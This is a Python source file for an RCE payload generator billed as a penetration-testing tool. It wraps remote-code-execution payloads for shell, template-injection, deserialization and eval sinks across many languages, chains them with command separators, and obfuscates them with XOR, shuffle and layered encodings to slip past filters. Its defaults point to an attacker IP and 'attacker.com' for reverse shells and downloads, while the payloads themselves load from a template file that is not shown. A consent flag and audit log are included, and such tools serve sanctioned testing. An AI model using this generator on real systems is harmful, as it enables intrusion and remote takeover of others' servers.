import argparse
import base64
import codecs
import json
import logging
import random
import string
import sys
import urllib.parse
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, Iterator, List, Optional, Set

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("rce_generator.log"),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

class RCEPayloadGenerator:
    def __init__(
        self,
        attacker_ip: str = "192.168.1.100",
        attacker_domain: str = "attacker.com",
        template_path: Optional[Path] = None,
    ):
        self.attacker_ip = attacker_ip
        self.attacker_domain = attacker_domain
        self.template_path = template_path or Path(__file__).parent / "templates" / "payloads.json"
        self.setup_components()

    def setup_components(self):
        """Initialize all payload components"""
        # Context-specific wrappers for different injection points
        self.contexts = {
            "html": {"prefix": "", "suffix": ""},
            "attribute": {"prefix": "\"", "suffix": "\""},
            "javascript": {"prefix": "';", "suffix": ";//"},
            "sql": {"prefix": "';", "suffix": "-- "},
            "php": {"prefix": "<?php ", "suffix": "?>"},
            "unix_shell": {"prefix": "", "suffix": ""},
            "windows_cmd": {"prefix": "", "suffix": ""},
            "powershell": {"prefix": "", "suffix": ""},
        }

        # Command separators and chainers for different environments
        self.separators = {
            "unix": ["; ", "| ", "|| ", "& ", "&& ", "%0a", "%0A", "${IFS}", "\\n"],
            "windows": ["&", "|", "%26", "%7C", "`|", "`&"],
            "php": [".", ";"],
            "javascript": [";", ","],
            "docker": ["; ", "&& ", "| "],
            "kubernetes": ["; ", "&& "],
        }

        # Sink-specific constraints (forbidden chars, requirements)
        self.sink_constraints: Dict[str, Dict[str, Any]] = {
            # General OS command sinks
            "unix_os_command": {"forbidden_chars": [";", "|", "&", "`", "(", ")"], "requires_quotes": False},
            "windows_os_command": {"forbidden_chars": ["&", "|", "^", "<", ">"], "requires_quotes": False},
            # Node.js sinks
            "nodejs_child_process_exec": {"forbidden_chars": [";", "|"], "requires_quotes": True},
            "nodejs_pug_ssti": {"forbidden_chars": ["{{", "}}"], "requires_quotes": False},
            "nodejs_ejs_ssti": {"forbidden_chars": ["<%", "%>"], "requires_quotes": False},
            "nodejs_handlebars_ssti": {"forbidden_chars": ["{{", "}}"], "requires_quotes": False},
            # Python sinks
            "python_os_system": {"forbidden_chars": [";", "|"], "requires_quotes": True},
            "python_jinja2_ssti": {"forbidden_chars": ["{{", "}}"], "requires_quotes": False},
            # PHP sinks
            "php_exec_system": {"forbidden_chars": [";", "|"], "requires_quotes": True},
            "php_deserialize": {"forbidden_chars": [], "requires_quotes": False},
            "php_eval": {"forbidden_chars": [], "requires_quotes": False},
            # Java sinks
            "java_runtime_exec": {"forbidden_chars": [";", "|"], "requires_quotes": True},
            "java_freemarker_ssti": {"forbidden_chars": ["${", "}"], "requires_quotes": False},
            "java_velocity_ssti": {"forbidden_chars": ["#", "$"], "requires_quotes": False},
            "java_thymeleaf_ssti": {"forbidden_chars": ["[[", "]]"], "requires_quotes": False},
            "java_deserialization": {"forbidden_chars": [], "requires_quotes": False},
            "java_expression": {"forbidden_chars": [], "requires_quotes": False},
            # .NET sinks
            "dotnet_process_start": {"forbidden_chars": ["&", "|"], "requires_quotes": True},
            "dotnet_deserialize": {"forbidden_chars": [], "requires_quotes": False},
            # Ruby sinks
            "ruby_kernel_system": {"forbidden_chars": [";", "|"], "requires_quotes": True},
            "ruby_erb_ssti": {"forbidden_chars": ["<%", "%>"], "requires_quotes": False},
            # Perl sinks
            "perl_system_backticks": {"forbidden_chars": [";", "|"], "requires_quotes": True},
            # Go sinks
            "go_os_exec": {"forbidden_chars": [";", "|"], "requires_quotes": True},
            # Node sinks
            "nodejs_vm_eval": {"forbidden_chars": [], "requires_quotes": False},
            "nodejs_deserialization": {"forbidden_chars": [], "requires_quotes": False},
        }

        self.payload_categories: Dict[str, Any] = {}
        self.detection_payloads: Dict[str, List[str]] = {}
        self._load_template_payloads()

        # Encoding and obfuscation techniques
        self.encoding_methods = {
            "none": lambda x: x,
            "url_encode": lambda x: urllib.parse.quote(x),
            "double_url_encode": lambda x: urllib.parse.quote(urllib.parse.quote(x)),
            "base64": lambda x: base64.b64encode(x.encode()).decode(),
            "hex": lambda x: x.encode().hex(),
            "rot13": lambda x: codecs.encode(x, 'rot13'),
            "random_case": lambda x: ''.join(random.choice([c.upper(), c.lower()]) for c in x),
            "insert_special_chars": lambda x: self.insert_special_chars(x, 0.1),
            "base64_then_url": lambda x: urllib.parse.quote(base64.b64encode(x.encode()).decode()),
            "rot13_then_base64": lambda x: base64.b64encode(codecs.encode(x, 'rot13').encode()).decode(),
            "double_base64": lambda x: base64.b64encode(base64.b64encode(x.encode())).decode(),
            "xor_polymorphic": self.xor_polymorphic_encode,
            "chunk_shuffle": self.chunk_shuffle_encode,
        }

    def _load_template_payloads(self) -> None:
        """Load payload templates from JSON/YAML files."""
        if not self.template_path.exists():
            logger.warning("Template file %s not found. Using fallback templates.", self.template_path)
            self.payload_categories = {}
            self.detection_payloads = {}
            return

        try:
            with open(self.template_path, "r", encoding="utf-8") as template_file:
                content = template_file.read()

            if self.template_path.suffix in {".yml", ".yaml"}:
                try:
                    import yaml  # type: ignore

                    data = yaml.safe_load(content)
                except Exception as exc:  # pragma: no cover - optional dependency
                    logger.error("Failed to parse YAML template %s: %s", self.template_path, exc)
                    raise
            else:
                data = json.loads(content)

            self.payload_categories = data.get("payload_categories", {})
            self.detection_payloads = data.get("detection_payloads", {})
        except Exception as exc:
            logger.error("Unable to load payload templates: %s", exc)
            self.payload_categories = {}
            self.detection_payloads = {}

    def insert_special_chars(self, s: str, frequency: float = 0.1) -> str:
        """Insert special characters randomly"""
        special_chars = ['%00', '%0a', '%0d', '%09', '%20', '%0b', '%0c']
        result = []
        for char in s:
            if random.random() < frequency:
                result.append(random.choice(special_chars))
            result.append(char)
        return ''.join(result)

    def xor_polymorphic_encode(self, payload: str) -> str:
        """Apply a simple XOR obfuscation with a random key and annotate the output."""
        key = random.randint(1, 255)
        encoded = ''.join(f"{ord(char) ^ key:02x}" for char in payload)
        return f"XOR({key}):{encoded}"

    def chunk_shuffle_encode(self, payload: str, chunk_size: int = 3) -> str:
        """Split the payload into chunks and shuffle them to create polymorphic variants."""
        if len(payload) <= chunk_size:
            return payload

        chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]
        random.shuffle(chunks)
        shuffled = ''.join(chunks)
        return f"shuffle::{shuffled}"

    def apply_constraints(self, payload: str, sink: str) -> str:
        """Apply sink-specific constraints to payload"""
        if sink not in self.sink_constraints:
            return payload
        
        constraints = self.sink_constraints[sink]
        forbidden = constraints.get('forbidden_chars', [])
        
        # Simple replacement for forbidden chars (e.g., encode them)
        for char in forbidden:
            if char in payload:
                # Replace with URL-encoded version as example
                payload = payload.replace(char, urllib.parse.quote(char))
        
        if constraints.get('requires_quotes', False):
            payload = f'"{payload}"'

        return payload

    def apply_watermark(self, payload: str, env: str, context_name: str, marker: str) -> str:
        """Embed a watermark comment or command into generated payloads where feasible."""
        watermark_token = f"RCEPayloadGen-ID:{marker}"

        if context_name == "attribute":
            logger.debug("Skipping watermark injection for attribute context due to quoting constraints.")
            return payload

        if env == "windows":
            return f"{payload} & REM {watermark_token}"
        if env in {"unix", "docker", "kubernetes"}:
            return f"{payload} ;# {watermark_token}"
        if env == "php":
            return f"{payload};/* {watermark_token} */"
        if env in {"python", "ruby", "perl"}:
            return f"{payload}  # {watermark_token}"
        if env in {"nodejs", "javascript"}:
            return f"{payload} // {watermark_token}"
        if env in {"java", "dotnet", "go"}:
            return f"{payload} /* {watermark_token} */"

        return f"{payload} /* {watermark_token} */"

    def generate_payloads(
        self,
        selected_contexts: List[str] = None,
        selected_categories: List[str] = None,
        selected_encodings: List[str] = None,
        selected_environments: List[str] = None,
        mode: str = "exploit",
        watermark_token: Optional[str] = None,
    ) -> Iterator[str]:
        """Generate payloads for detection or exploitation modes."""
        generated_payloads: Set[str] = set()

        if mode == "detection":
            yield from self._generate_detection_payloads(
                selected_contexts,
                selected_encodings,
                selected_environments,
                generated_payloads,
            )
            return

        contexts = selected_contexts if selected_contexts else list(self.contexts.keys())
        categories = selected_categories if selected_categories else list(self.payload_categories.keys())
        encodings = selected_encodings if selected_encodings else list(self.encoding_methods.keys())
        environments = selected_environments if selected_environments else [
            "unix",
            "windows",
            "nodejs",
            "python",
            "php",
            "java",
            "dotnet",
            "ruby",
            "perl",
            "go",
            "javascript",
            "docker",
            "kubernetes",
        ]

        logger.info(
            "Generating payloads for contexts: %s, categories: %s, encodings: %s, environments: %s",
            contexts,
            categories,
            encodings,
            environments,
        )

        for context_name in contexts:
            if context_name not in self.contexts:
                logger.warning("Unknown context: %s", context_name)
                continue

            context = self.contexts[context_name]

            for category_name in categories:
                if category_name not in self.payload_categories:
                    logger.warning("Unknown category: %s", category_name)
                    continue

                category = self.payload_categories[category_name]

                for env in environments:
                    if env not in category:
                        continue

                    env_payloads = category[env]
                    if isinstance(env_payloads, dict):  # For code_execution with sinks
                        for sink, payloads in env_payloads.items():
                            sink_key = f"{env}_{sink.replace('.', '_')}"
                            for base_payload in payloads:
                                constrained_payload = self.apply_constraints(base_payload, sink_key)
                                for wrapped_payload in self._generate_variations(
                                    constrained_payload,
                                    context,
                                    env,
                                    encodings,
                                    generated_payloads,
                                    context_name,
                                    watermark_token,
                                ):
                                    yield wrapped_payload
                    else:
                        for base_payload in env_payloads:
                            for wrapped_payload in self._generate_variations(
                                base_payload,
                                context,
                                env,
                                encodings,
                                generated_payloads,
                                context_name,
                                watermark_token,
                            ):
                                yield wrapped_payload

    def _generate_detection_payloads(
        self,
        selected_contexts: Optional[List[str]],
        selected_encodings: Optional[List[str]],
        selected_environments: Optional[List[str]],
        generated_payloads: Set[str],
    ) -> Iterator[str]:
        contexts = selected_contexts if selected_contexts else list(self.contexts.keys())
        encodings = selected_encodings if selected_encodings else list(self.encoding_methods.keys())
        environments = selected_environments if selected_environments else list(self.detection_payloads.keys())

        logger.info(
            "Generating detection payloads for contexts: %s, encodings: %s, environments: %s",
            contexts,
            encodings,
            environments,
        )

        for context_name in contexts:
            if context_name not in self.contexts:
                logger.warning("Unknown context: %s", context_name)
                continue

            context = self.contexts[context_name]

            for env in environments:
                payloads = self.detection_payloads.get(env, [])
                for base_payload in payloads:
                    formatted = base_payload.replace("{attacker_ip}", self.attacker_ip)
                    formatted = formatted.replace("{canary}", self._generate_canary())
                    for wrapped_payload in self._encode_and_wrap(
                        formatted,
                        context,
                        encodings,
                        generated_payloads,
                    ):
                        yield wrapped_payload

    def _generate_variations(
        self,
        base_payload: str,
        context: Dict[str, str],
        env: str,
        encodings: List[str],
        generated_payloads: Set[str],
        context_name: str,
        watermark_token: Optional[str],
    ) -> Iterator[str]:
        """Helper to generate payload variations with separators and encodings"""
        formatted_payload = base_payload.replace("{attacker_ip}", self.attacker_ip).replace("{attacker_domain}", self.attacker_domain)

        # Add with separators
        if env in self.separators:
            for sep in self.separators[env]:
                full_payload = f"{sep}{formatted_payload}"
                if watermark_token:
                    full_payload = self.apply_watermark(full_payload, env, context_name, watermark_token)
                for wrapped_payload in self._encode_and_wrap(full_payload, context, encodings, generated_payloads):
                    yield wrapped_payload

        # Add without separator
        base_variant = formatted_payload
        if watermark_token:
            base_variant = self.apply_watermark(base_variant, env, context_name, watermark_token)

        for wrapped_payload in self._encode_and_wrap(base_variant, context, encodings, generated_payloads):
            yield wrapped_payload

    def _encode_and_wrap(
        self,
        payload: str,
        context: Dict[str, str],
        encodings: List[str],
        generated_payloads: Set[str],
    ) -> Iterator[str]:
        """Apply encodings and context wrapping"""
        for enc_name in encodings:
            if enc_name not in self.encoding_methods:
                continue
                
            try:
                enc_func = self.encoding_methods[enc_name]
                encoded_payload = enc_func(payload)
                
                wrapped_payload = f"{context['prefix']}{encoded_payload}{context['suffix']}"
                
                if wrapped_payload not in generated_payloads:
                    generated_payloads.add(wrapped_payload)
                    yield wrapped_payload
            except Exception as e:
                logger.error(f"Error encoding payload: {e}")

    def _generate_canary(self) -> str:
        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))

    def save_payloads_to_file(self, file_path: str, max_payloads: int = None, **kwargs) -> int:
        """
        Generate payloads and save them to a file

        Args:
            file_path: Path to the output file
            max_payloads: Maximum number of payloads to generate (None for unlimited)
            **kwargs: Arguments to pass to generate_payloads
            
        Returns:
            Number of payloads generated
        """
        count = 0
        try:
            with open(file_path, "w") as file:
                for payload in self.generate_payloads(**kwargs):
                    file.write(payload + "\n")
                    count += 1
                    if max_payloads and count >= max_payloads:
                        break

            logger.info(f"Successfully generated {count} payloads to {file_path}")
        except Exception as e:
            logger.error(f"Error writing to file {file_path}: {e}")

        return count

    def log_exploitation_usage(self, watermark_token: str, arguments: argparse.Namespace) -> None:
        audit_path = Path("exploit_audit.log")
        try:
            with audit_path.open("a", encoding="utf-8") as audit_file:
                timestamp = datetime.now(timezone.utc).isoformat()
                audit_file.write(
                    f"{timestamp} | token={watermark_token} | ip={self.attacker_ip} | domain={self.attacker_domain} | args={vars(arguments)}\n"
                )
        except Exception as exc:
            logger.error("Unable to log exploitation usage: %s", exc)

def main():
    parser = argparse.ArgumentParser(description="Generate RCE payloads for penetration testing")
    parser.add_argument("-o", "--output", default="rce_payloads.txt",
                       help="Output file path (default: rce_payloads.txt)")
    parser.add_argument("--attacker-ip", default="192.168.1.100",
                       help="Attacker IP for reverse shells (default: 192.168.1.100)")
    parser.add_argument("--attacker-domain", default="attacker.com",
                       help="Attacker domain for download payloads (default: attacker.com)")
    parser.add_argument("--max-payloads", type=int, default=None,
                       help="Maximum number of payloads to generate (default: unlimited)")
    parser.add_argument("--contexts", nargs="+", default=None,
                       help="Contexts to generate (default: all)")
    parser.add_argument("--categories", nargs="+", default=None,
                       help="Categories to generate (default: all)")
    parser.add_argument("--encodings", nargs="+", default=None,
                       help="Encoding methods to apply (default: all)")
    parser.add_argument("--environments", nargs="+", default=None,
                       help="Environments to generate (default: all)")
    parser.add_argument("--template-file", type=str, default=None,
                        help="Path to a custom payload template file (JSON or YAML)")
    parser.add_argument("--detection-only", action="store_true",
                        help="Generate benign payloads for detection and validation")
    parser.add_argument("--acknowledge-consent", action="store_true",
                        help="Acknowledge that exploitation payloads will only be used with proper authorization")

    args = parser.parse_args()

    template_path = Path(args.template_file) if args.template_file else None
    # Initialize generator
    generator = RCEPayloadGenerator(
        attacker_ip=args.attacker_ip,
        attacker_domain=args.attacker_domain,
        template_path=template_path,
    )

    mode = "detection" if args.detection_only else "exploit"

    if mode == "exploit" and not args.acknowledge_consent:
        print("[!] Exploitation mode requires explicit consent. Re-run with --acknowledge-consent after confirming authorization.")
        return

    watermark_token = None
    if mode == "exploit":
        watermark_token = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
        generator.log_exploitation_usage(watermark_token, args)

    count = generator.save_payloads_to_file(
        file_path=args.output,
        max_payloads=args.max_payloads,
        selected_contexts=args.contexts,
        selected_categories=args.categories,
        selected_encodings=args.encodings,
        selected_environments=args.environments,
        mode=mode,
        watermark_token=watermark_token,
    )

    print(f"Generated {count} payloads to {args.output} in {mode} mode")

if __name__ == "__main__":
    main()
